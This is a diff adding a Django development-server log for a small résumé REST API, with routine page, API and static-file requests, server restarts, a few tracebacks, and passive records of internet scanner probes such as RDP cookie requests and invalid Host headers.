@@ -1,0 +1,988 @@
+Error
+Error
+[01/Oct/2018 20:42:47] "GET / HTTP/1.1" 200 1145
+Not Found: /favicon.ico
+[01/Oct/2018 20:42:47] "GET /favicon.ico HTTP/1.1" 404 2550
+[01/Oct/2018 20:44:33] "GET /api HTTP/1.1" 301 0
+[01/Oct/2018 20:44:33] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1735
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
+[01/Oct/2018 20:44:33] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[01/Oct/2018 20:45:09] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 21:00:48] "GET / HTTP/1.1" 200 1145
+[01/Oct/2018 21:02:23] "GET /api/ HTTP/1.1" 200 5286
+Not Found: /frontends/views.api
+[01/Oct/2018 21:02:39] "GET /frontends/views.api HTTP/1.1" 404 2574
+[01/Oct/2018 21:02:50] "GET /hello-world.txt HTTP/1.1" 200 11
+[01/Oct/2018 21:03:12] "GET /image.jpg HTTP/1.1" 200 11
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 20:45:28
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:09:54
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:12:46] "GET /image.jpg HTTP/1.1" 200 59982
+[01/Oct/2018 21:12:57] "GET /hello-world.txt HTTP/1.1" 200 11
+[01/Oct/2018 21:13:08] "GET /image.jpg HTTP/1.1" 200 59982
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:12:44
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:14:04] "GET /image.jpg HTTP/1.1" 200 11
+[01/Oct/2018 21:14:07] "GET /image.jpg HTTP/1.1" 200 11
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:14:03
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:17:43] "GET /image.jpg HTTP/1.1" 200 44969
+[01/Oct/2018 21:22:00] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[01/Oct/2018 21:22:00] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[01/Oct/2018 21:22:03] "GET / HTTP/1.1" 200 1145
+[01/Oct/2018 21:23:36] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 21:23:38] "GET /api/person/1 HTTP/1.1" 301 0
+Not Found: /api/person/1/
+[01/Oct/2018 21:23:38] "GET /api/person/1/ HTTP/1.1" 404 7675
+[01/Oct/2018 21:23:38] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[01/Oct/2018 21:23:49] "GET /api/person/0 HTTP/1.1" 301 0
+Not Found: /api/person/0/
+[01/Oct/2018 21:23:49] "GET /api/person/0/ HTTP/1.1" 404 7675
+Not Found: /api/person/0/
+[01/Oct/2018 21:23:53] "GET /api/person/0/ HTTP/1.1" 404 7675
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:17:40
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:26:56] "GET / HTTP/1.1" 200 1252
+Not Found: /api/person/1/
+[01/Oct/2018 21:26:57] "GET /api/person/1/ HTTP/1.1" 404 98
+/home/ubuntu/venvDir/lib/python3.5/site-packages/rest_framework/pagination.py:198: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'api.models.Person'> QuerySet.
+  paginator = self.django_paginator_class(queryset, page_size)
+[01/Oct/2018 21:27:36] "GET /api/person/ HTTP/1.1" 200 7893
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:25:32
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:35:57
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:36:30] "GET / HTTP/1.1" 200 1252
+Not Found: /api/person/1/
+[01/Oct/2018 21:36:30] "GET /api/person/1/ HTTP/1.1" 404 98
+[01/Oct/2018 21:36:36] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 21:36:39] "GET /api/ HTTP/1.1" 200 5286
+/home/ubuntu/venvDir/lib/python3.5/site-packages/rest_framework/pagination.py:198: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'api.models.Person'> QuerySet.
+  paginator = self.django_paginator_class(queryset, page_size)
+[01/Oct/2018 21:36:46] "GET /api/person/ HTTP/1.1" 200 12652
+[01/Oct/2018 21:36:59] "GET /api/ HTTP/1.1" 200 5286
+[01/Oct/2018 21:37:00] "GET /api/person/ HTTP/1.1" 200 12652
+[01/Oct/2018 21:41:31] "POST /api/person/ HTTP/1.1" 201 10355
+[01/Oct/2018 21:41:38] "GET /api/person/1/ HTTP/1.1" 200 10403
+Not Found: /api/person/0/
+[01/Oct/2018 21:41:43] "GET /api/person/0/ HTTP/1.1" 404 12304
+[01/Oct/2018 21:42:45] "GET / HTTP/1.1" 200 1252
+[01/Oct/2018 21:42:45] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 21:47:09] "GET / HTTP/1.1" 200 1252
+[01/Oct/2018 21:47:09] "GET /api/person/1/ HTTP/1.1" 200 220
+Performing system checks...
+
+System check identified no issues (0 silenced).
+October 01, 2018 - 21:36:28
+Django version 2.1.1, using settings 'webresume.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[01/Oct/2018 21:48:09] "GET / HTTP/1.1" 200 1270
+[01/Oct/2018 21:48:10] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 21:49:20] "GET / HTTP/1.1" 200 1372
+[01/Oct/2018 21:49:20] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 21:51:19] "GET / HTTP/1.1" 200 1372
+[01/Oct/2018 21:51:19] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 22:52:59] "GET / HTTP/1.1" 200 1372
+[01/Oct/2018 22:53:00] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 23:35:52] "GET / HTTP/1.1" 200 1372
+[01/Oct/2018 23:35:52] "GET /api/person/1/ HTTP/1.1" 200 220
+[01/Oct/2018 23:36:18] "GET /hello-world.txt HTTP/1.1" 200 11
+[01/Oct/2018 23:36:25] "GET /image.jpg HTTP/1.1" 200 44969
+[02/Oct/2018 02:27:26] "GET / HTTP/1.1" 200 1372
+[02/Oct/2018 02:27:27] "GET /api/person/1/ HTTP/1.1" 200 220
+[02/Oct/2018 15:32:33] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[02/Oct/2018 15:32:33] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+[03/Oct/2018 05:44:00] "GET / HTTP/1.1" 200 1372
+[03/Oct/2018 05:44:02] "GET /api/person/1/ HTTP/1.1" 200 220
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Oct/2018 05:47:18] "GET / HTTP/1.0" 400 60209
+[03/Oct/2018 09:45:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[03/Oct/2018 09:45:14] "  /*à     Cookie: mstshash=Administr" 400 -
+[03/Oct/2018 13:40:20] "GET / HTTP/1.1" 200 1372
+[03/Oct/2018 13:40:21] "GET /api/person/1/ HTTP/1.1" 200 220
+Invalid HTTP_HOST header: '1.2.3.4:1234'. You may need to add '1.2.3.4' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Oct/2018 18:15:56] "POST / HTTP/1.1" 400 60809
+[04/Oct/2018 01:54:13] "GET / HTTP/1.1" 200 1372
+[04/Oct/2018 01:54:14] "GET /api/person/1/ HTTP/1.1" 200 220
+[04/Oct/2018 03:44:43] "GET / HTTP/1.1" 200 1372
+[04/Oct/2018 03:44:45] "GET /api/person/1/ HTTP/1.1" 200 220
+[04/Oct/2018 07:28:31] "GET / HTTP/1.1" 200 1372
+[04/Oct/2018 07:30:52] code 400, message Bad request syntax ("\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[µÁ¬øYÂ/\x1f\x93J\x03T\x11\x0bm\x06Ð\x98R\x9aK\x02PÞ·èä\x1f:6+\x00\x008À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+[04/Oct/2018 07:30:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Oct/2018 07:30:52] code 400, message Bad request version ("\x00\x008À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+[04/Oct/2018 07:30:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Oct/2018 09:26:49] "GET / HTTP/1.1" 200 1372
+[04/Oct/2018 17:29:47] "GET / HTTP/1.1" 200 1372
+Not Found: /status
+[05/Oct/2018 03:05:37] "GET /status HTTP/1.1" 404 2535
+[05/Oct/2018 04:09:43] "GET / HTTP/1.1" 200 1372
+[05/Oct/2018 05:06:25] "GET / HTTP/1.1" 200 1372
+[05/Oct/2018 05:06:26] "GET /api/person/1/ HTTP/1.1" 200 220
+[05/Oct/2018 14:40:31] "GET / HTTP/1.1" 200 1372
+[05/Oct/2018 14:40:35] "GET /api/person/1/ HTTP/1.1" 200 220
+[05/Oct/2018 22:26:31] "GET / HTTP/1.1" 200 1372
+[05/Oct/2018 23:13:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[05/Oct/2018 23:13:05] "  /*à     Cookie: mstshash=Administr" 400 -
+[06/Oct/2018 03:27:21] "GET / HTTP/1.1" 200 1372
+[06/Oct/2018 03:27:28] "GET /api/person/1/ HTTP/1.1" 200 220
+[06/Oct/2018 15:25:13] "GET / HTTP/1.1" 200 1372
+[06/Oct/2018 15:25:15] "GET /api/person/1/ HTTP/1.1" 200 220
+[06/Oct/2018 16:01:16] "GET /api/person/1/ HTTP/1.1" 200 220
+[06/Oct/2018 16:03:43] "GET / HTTP/1.1" 200 1372
+Not Found: /HNAP1/
+[06/Oct/2018 16:03:44] "GET /HNAP1/ HTTP/1.1" 404 2535
+[06/Oct/2018 22:32:12] "GET / HTTP/1.1" 200 1372
+[06/Oct/2018 22:32:18] "GET /api/person/1/ HTTP/1.1" 200 220
+[07/Oct/2018 00:40:57] "GET /api/person/1/ HTTP/1.1" 200 220
+[07/Oct/2018 01:42:28] "GET / HTTP/1.1" 200 1372
+[07/Oct/2018 01:42:28] "GET /api/person/1/ HTTP/1.1" 200 220
+[07/Oct/2018 01:42:36] "GET /api HTTP/1.1" 301 0
+[07/Oct/2018 01:42:36] "GET /api/ HTTP/1.1" 200 5286
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[07/Oct/2018 01:42:37] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[07/Oct/2018 02:13:56] "GET / HTTP/1.1" 200 1372
+[07/Oct/2018 02:13:58] "GET /api HTTP/1.1" 301 0
+[07/Oct/2018 02:13:58] "GET /api/ HTTP/1.1" 200 5286
+[07/Oct/2018 02:14:00] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[07/Oct/2018 02:14:02] "GET /api/ HTTP/1.1" 200 5286
+Not Found: /person
+[07/Oct/2018 02:14:10] "GET /person HTTP/1.1" 404 2535
+[07/Oct/2018 02:14:15] "GET /api/ HTTP/1.1" 200 5286
+/home/ubuntu/venvDir/lib/python3.5/site-packages/rest_framework/pagination.py:198: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'api.models.Person'> QuerySet.
+  paginator = self.django_paginator_class(queryset, page_size)
+[07/Oct/2018 02:14:20] "GET /api/person/ HTTP/1.1" 200 13219
+[07/Oct/2018 02:14:20] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[07/Oct/2018 02:28:25] "GET / HTTP/1.1" 200 1372
+[07/Oct/2018 02:28:25] "GET /api/person/1/ HTTP/1.1" 200 220
+[07/Oct/2018 03:40:37] "GET / HTTP/1.1" 200 1372
+[07/Oct/2018 03:40:38] "GET /api/person/1/ HTTP/1.1" 200 220
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Oct/2018 10:10:39] "GET / HTTP/1.0" 400 60210
+[07/Oct/2018 15:03:25] "GET / HTTP/1.1" 200 1372
+[07/Oct/2018 15:03:27] "GET /api/person/1/ HTTP/1.1" 200 220
+Not Found: /person
+[08/Oct/2018 03:52:43] "GET /person HTTP/1.1" 404 2535
+[08/Oct/2018 04:35:42] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:35:42] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[08/Oct/2018 04:35:43] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[08/Oct/2018 04:35:56] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 04:35:56] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 04:35:58] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:36:03] "OPTIONS /api/ HTTP/1.1" 200 5741
+[08/Oct/2018 04:36:07] "GET /api/?format=vnd.api%2Bjson HTTP/1.1" 200 83
+[08/Oct/2018 04:36:11] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:36:13] "GET /api/?format=api HTTP/1.1" 200 5352
+[08/Oct/2018 04:36:15] "OPTIONS /api/?format=api HTTP/1.1" 200 5785
+[08/Oct/2018 04:36:19] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:36:20] "GET /admin HTTP/1.1" 301 0
+[08/Oct/2018 04:36:20] "GET /admin/ HTTP/1.1" 302 0
+[08/Oct/2018 04:36:20] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
+[08/Oct/2018 04:36:20] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
+[08/Oct/2018 04:36:20] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[08/Oct/2018 04:36:20] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
+[08/Oct/2018 04:36:21] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[08/Oct/2018 04:36:21] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[08/Oct/2018 04:36:21] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[08/Oct/2018 04:36:31] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 1982
+[08/Oct/2018 04:36:31] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
+[08/Oct/2018 04:36:34] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
+[08/Oct/2018 04:36:37] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
+[08/Oct/2018 04:36:54] "GET /hello-world.txt HTTP/1.1" 200 11
+[08/Oct/2018 04:36:58] "GET /image.jpg HTTP/1.1" 200 44969
+[08/Oct/2018 04:37:02] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 04:37:02] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 04:37:06] "GET /api/ HTTP/1.1" 200 5286
+Not Found: /person
+[08/Oct/2018 04:37:12] "GET /person HTTP/1.1" 404 2535
+[08/Oct/2018 04:37:18] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:37:19] "GET /api/person/ HTTP/1.1" 200 13219
+[08/Oct/2018 04:37:19] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[08/Oct/2018 04:39:36] "GET /api/ HTTP/1.1" 200 5286
+[08/Oct/2018 04:39:38] "GET /api/person/ HTTP/1.1" 200 13219
+[08/Oct/2018 05:06:20] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 05:06:25] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 10:02:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[08/Oct/2018 10:02:11] "  +&à     Cookie: mstshash=hello" 400 -
+[08/Oct/2018 15:59:22] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 15:59:23] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 16:18:49] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 16:21:48] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 16:21:49] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 16:36:45] "GET /api/person/1/ HTTP/1.1" 200 220
+[08/Oct/2018 18:09:05] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 18:09:06] "GET /api/person/1/ HTTP/1.1" 200 220
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Oct/2018 19:54:42] "GET / HTTP/1.1" 400 60210
+[08/Oct/2018 19:59:11] "GET / HTTP/1.1" 200 1372
+[08/Oct/2018 19:59:12] "GET /api/person/1/ HTTP/1.1" 200 220
+Not Found: /favicon.ico
+[08/Oct/2018 20:18:46] "GET /favicon.ico HTTP/1.1" 404 2550
+[08/Oct/2018 21:55:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[08/Oct/2018 21:55:18] "  +&à     Cookie: mstshash=hello" 400 -
+[09/Oct/2018 01:44:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[09/Oct/2018 01:44:33] "  +&à     Cookie: mstshash=hello" 400 -
+[09/Oct/2018 01:50:28] "GET / HTTP/1.1" 200 1372
+[09/Oct/2018 11:46:15] "GET / HTTP/1.1" 200 1372
+[09/Oct/2018 13:03:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[09/Oct/2018 13:03:04] "  /*à     Cookie: mstshash=Administr" 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[10/Oct/2018 03:11:47] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[10/Oct/2018 08:05:29] "GET / HTTP/1.0" 400 60211
+[10/Oct/2018 12:05:16] "GET / HTTP/1.1" 200 1372
+Not Found: /favicon.ico
+[10/Oct/2018 12:05:17] "GET /favicon.ico HTTP/1.1" 404 2550
+[10/Oct/2018 19:39:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[10/Oct/2018 19:39:01] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[11/Oct/2018 10:17:50] "GET / HTTP/1.0" 400 60210
+[11/Oct/2018 15:30:14] "GET / HTTP/1.1" 200 1372
+[12/Oct/2018 00:49:31] "GET /api/person/ HTTP/1.1" 200 13219
+[12/Oct/2018 00:49:34] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[12/Oct/2018 00:49:34] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[12/Oct/2018 00:49:34] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
+[12/Oct/2018 00:49:35] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[12/Oct/2018 00:49:35] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
+[12/Oct/2018 00:49:35] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[12/Oct/2018 00:49:35] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1735
+[12/Oct/2018 00:49:35] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
+[12/Oct/2018 00:49:36] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[12/Oct/2018 00:49:36] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
+[12/Oct/2018 00:49:40] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[12/Oct/2018 00:49:40] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+Not Found: /favicon.ico
+[12/Oct/2018 00:49:40] "GET /favicon.ico HTTP/1.1" 404 2550
+[12/Oct/2018 02:40:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[12/Oct/2018 02:40:30] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /favicon.ico
+[12/Oct/2018 04:45:09] "GET /favicon.ico HTTP/1.1" 404 2550
+[12/Oct/2018 07:33:06] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Oct/2018 09:01:36] "GET / HTTP/1.0" 400 60209
+[12/Oct/2018 14:48:56] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[12/Oct/2018 14:48:56] "  /*à     Cookie: mstshash=Administr" 400 -
+[12/Oct/2018 20:38:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[12/Oct/2018 20:38:05] "  /*à     Cookie: mstshash=Administr" 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[13/Oct/2018 21:27:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[13/Oct/2018 21:27:36] "  *%à     Cookie: mstshash=Test" 400 -
+[13/Oct/2018 21:27:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[13/Oct/2018 21:27:36] "  *%à     Cookie: mstshash=Test" 400 -
+[14/Oct/2018 01:56:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 01:56:41] "  /*à     Cookie: mstshash=Administr" 400 -
+[14/Oct/2018 07:54:11] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[14/Oct/2018 07:54:11] "    c                           " 400 -
+[14/Oct/2018 09:01:53] "GET / HTTP/1.1" 200 1372
+[14/Oct/2018 09:51:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 09:51:06] "  /*à     Cookie: mstshash=Administr" 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
